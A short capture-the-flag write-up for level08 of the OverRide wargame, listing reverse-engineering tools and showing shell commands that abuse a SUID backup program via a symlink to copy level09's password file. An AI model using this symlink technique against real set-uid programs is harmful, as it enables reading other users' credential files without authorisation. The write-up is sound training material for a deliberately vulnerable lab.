# Tools
[Dogbolt - Decompiler Explorator](https://dogbolt.org/)
[Cutter - Reverse Engineering Tool](https://cutter.re/)
[GNU DeBugger - GDB](https://fr.wikipedia.org/wiki/GNU_Debugger)

# Exploit 
Level08 is a throwback to the good old days of snow-crash and symlinks. 

# Explanation
The program starts to open the file passed as the first parameter to back up its content. It has the SUID bit on and is owned by level09 so we can use it to capture the level09 `.pass` file. 

If we pass the absolute path or something with `../`, it causes issues.

Thus, we create a symlink `flag` that links to level09's .pass and give it to the program, that writes its content in the `backups` folder.
```
level08@OverRide:~$ ./level08 "/home/users/level09/.pass"
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:~$ ln -s /home/users/level09/.pass flag
level08@OverRide:~$ ./level08 "flag"
level08@OverRide:~$ cat backups/flag
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

# Resources
